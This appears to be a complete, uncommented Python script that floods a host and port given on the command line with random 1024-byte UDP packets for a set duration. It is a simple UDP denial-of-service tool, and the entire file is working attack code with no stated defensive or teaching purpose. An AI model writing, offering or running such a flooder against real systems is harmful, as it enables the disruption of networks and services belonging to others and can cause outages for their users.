import sys
import time
import socket
import random

host = sys.argv[1]
port = int(sys.argv[2])
duration = int(sys.argv[3])
timeout = time.time() + duration
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
packet = random._urandom(1024)

while time.time() < timeout:
    sock.sendto(packet, (host, port))